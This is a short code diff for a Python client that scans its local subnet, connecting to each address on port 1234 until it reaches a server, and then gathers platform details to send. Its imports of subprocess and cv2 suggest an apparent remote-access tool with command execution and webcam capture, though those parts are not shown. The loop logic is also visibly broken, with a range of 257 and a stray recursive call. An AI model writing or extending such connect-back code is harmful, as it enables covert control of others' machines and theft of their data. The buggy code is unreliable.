@@ -9,25 +9,24 @@ from sys import executable, argv
 import subprocess
 import cv2
 
-ip_server = "192.168.43.234"
 port_server = 1234
 system_info = {}
-
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-def get_server_ip():
+
+def handle_connection():
     s = socket.gethostbyname(socket.gethostname())
     argum = s.split(".")
     for i in range(257):
         argum[3] = i
-        ip = f"{argum[0]}.{argum[1]}.{argum[2]}.{argum[3]}" 
-
-def handle_connection():
-    while True:
+        ip_server = f"{argum[0]}.{argum[1]}.{argum[2]}.{argum[3]}"
+        print(ip_server)
         try:
             sock.connect((ip_server, port_server))
             break
         except:
-            continue
+            pass
+        else:
+            handle_connection()
 
 def send_system_info():
     system_info["platform"] =  system()
